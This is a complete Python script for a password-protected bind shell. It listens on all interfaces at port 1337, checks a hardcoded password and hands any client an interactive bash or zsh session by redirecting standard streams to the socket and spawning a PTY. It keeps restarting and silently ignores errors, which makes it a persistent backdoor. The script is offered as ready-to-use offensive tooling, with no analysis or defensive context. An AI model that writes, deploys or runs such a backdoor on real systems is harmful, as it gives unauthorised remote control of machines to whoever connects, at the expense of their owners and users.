import socket
import os
import pty

BIND_IP = "0.0.0.0"
BIND_PORT = 1337
PASSWORD = "your_pass" 

SHELLS = {"1": "/bin/bash", "2": "/bin/zsh"}

def bind_shell():
    while True: 
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((BIND_IP, BIND_PORT))
            s.listen(1)
            conn, addr = s.accept()
            
            conn.send(b"Enter password: ")
            received_password = conn.recv(1024).strip().decode()
            
            if received_password != PASSWORD:
                conn.send(b"ur not welcome :(!\n")
                conn.close()
                continue
            
            conn.send(b"Welcome, Sir!\n")
            
            while True:
                conn.send(b"Choose shell:\n1. Bash\n2. Zsh\nEnter choice: ")
                choice = conn.recv(1024).strip().decode()
                
                shell = SHELLS.get(choice)
                
                if shell and os.path.exists(shell):
                    break
                else:
                    conn.send(b"Shell not found. Please choose again.\n")
            
            os.dup2(conn.fileno(), 0)
            os.dup2(conn.fileno(), 1)
            os.dup2(conn.fileno(), 2)
            
            
            pty.spawn(shell)
            
            conn.close()
            s.close()
        except Exception as e:
            continue 

if __name__ == "__main__":
    bind_shell()
